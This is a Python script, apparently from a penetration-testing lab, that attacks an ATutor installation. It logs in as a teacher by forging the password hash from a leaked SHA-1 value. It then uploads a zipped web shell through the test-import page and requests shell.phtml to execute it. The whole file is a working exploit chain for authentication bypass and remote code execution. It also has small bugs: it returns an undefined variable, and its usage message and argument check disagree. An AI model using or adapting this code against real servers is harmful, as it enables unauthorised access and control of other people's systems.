import sys, hashlib, requests

#constants
http_proxy  = "http://127.0.0.1:8080"
https_proxy = "https://127.0.0.1:8080"
ftp_proxy   = "ftp://127.0.0.1:8080"

proxyDict = { 
	"http"  : http_proxy, 
	"https" : https_proxy, 
	"ftp"   : ftp_proxy
}

def gen_hash(passwd, token):
	#js: sha1(sha1(password) + token) 
	# sha1(password) is obtained through the sql in searchfriends
	#token is user controled
	m = hashlib.sha1()
	m.update(passwd + token)
	return m.hexdigest()

def uploadShell():
	target = "http://%s/ATutor/login.php" % sys.argv[1]
	token = "hax"
	hashed = gen_hash('8635fc4e2a0c7d9d2d9ee40ea8bf2edd76d5757e', token)
	d = {
	"form_password_hidden" : hashed,
	"form_login": "teacher",
	"submit": "Login",
	"token" : token
	}
	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
	}
	#first login
	s = requests.Session()
	r = s.post(target, data=d,proxies=proxyDict, headers=headers)
	
	#get course
	r1 = s.get("http://"+sys.argv[1]+"/ATutor/bounce.php?course=16777215", proxies=proxyDict, headers=headers)
	r2 = s.get ("http://"+sys.argv[1]+"/ATutor/mods/_standard/tests/my_tests.php", proxies=proxyDict, headers=headers)
	r3 = s.get("http://"+sys.argv[1]+"/ATutor/mods/_standard/tests/index.php", proxies=proxyDict, headers=headers)
	#then upload
	zippedShell = open('poc.zip', 'rb')
	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
	}
	target1 = "http://%s/ATutor/mods/_standard/tests/import_test.php" % sys.argv[1]
	r4 = s.post(target1, files = { "file" : ("poc.zip", zippedShell,'application/zip' ) }, data = {"submit_import" : "Import" },  proxies=proxyDict, headers=headers)
	#then execute shell
	r5 = s.get("http://"+sys.argv[1]+"/ATutor/mods/poc/shell.phtml", proxies=proxyDict, headers=headers)

	#print r.cookies
	res = r.text
	if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
 		return ck
 	return None


def main():
	if len(sys.argv) != 2:
		print "(+) usage: %s <target> <hash>" % sys.argv[0]
		print "(+) eg: %s 192.168.1.22 56b11a0603c7b7b8b4f06918e1bb5378ccd481cc" %sys.argv[0]
		sys.exit(-1)
	cokie = uploadShell()
	if cokie is None:
		print 'Failed to login'
	print "Got cookie!"
	#shellUpload(cokie)

if __name__ == "__main__":
	main()
